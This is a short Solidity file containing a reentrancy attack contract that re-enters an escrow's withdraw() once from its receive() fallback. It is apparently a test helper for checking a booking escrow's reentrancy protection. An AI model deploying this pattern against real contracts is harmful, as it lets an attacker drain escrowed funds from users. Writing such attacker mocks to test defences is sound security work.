// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEscrow {
    function releaseFunds(bytes32 bookingId) external;
    function withdraw() external;
}

contract ReentrantDriver {
    IEscrow public escrow;
    bytes32 public bookingId;
    bool public attackEnabled;

    constructor(address escrowAddress) {
        escrow = IEscrow(escrowAddress);
    }

    function arm(bytes32 targetBookingId) external {
        bookingId = targetBookingId;
        attackEnabled = true;
    }

    function attackWithdraw() external {
        attackEnabled = true;
        escrow.withdraw();
    }

    receive() external payable {
        if (attackEnabled) {
            attackEnabled = false;
            escrow.withdraw();
        }
    }
}
